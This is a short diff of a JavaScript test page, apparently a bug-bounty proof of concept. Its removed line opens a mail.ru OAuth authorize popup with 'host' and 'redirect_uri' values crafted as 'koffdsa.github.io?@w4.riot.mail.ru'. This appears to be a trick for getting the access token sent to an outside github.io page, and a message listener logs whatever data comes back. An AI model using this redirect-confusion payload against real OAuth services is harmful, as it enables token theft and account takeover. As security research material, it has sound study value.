@@ -12,7 +12,7 @@
 var h1Win;
 var s;
 function openWin(){
-	h1Win = window.open("https://connect.mail.ru/oauth/authorize?response_type=token&client_id=631375&relation=opener&host=https%3a%2f%2fkoffdsa.github.io?@w4.riot.mail.ru&send_message=1&display=popup&sig=b5705d31fdeecdc5ba46445091e9f8bd&redirect_uri=https%3A%2F%2Fconnect.mail.ru%2Fproxy%3Fapp_id%3D631375%26send_message%3D1%26host%3Dhttps%3A%2F%2Fkoffdsa.github.io?@w4.riot.mail.ru&fail=1&site_id=1_1176_63618_0__");
+	h1Win = window.open("https://www.google.com");
 	}
 
 	function sendMessage(){
@@ -25,7 +25,7 @@ function openWin(){
  
     // 接受server返回数据
     window.addEventListener('message', function(e) {
-        console.log('Get data from oneplus ---> ' + e.data);
+        console.log('Get data from oneplus ---> ' + e);
 	//clearInterval(s);
     }, false);
 document.getElementById("openH1").addEventListener('click', openWin);
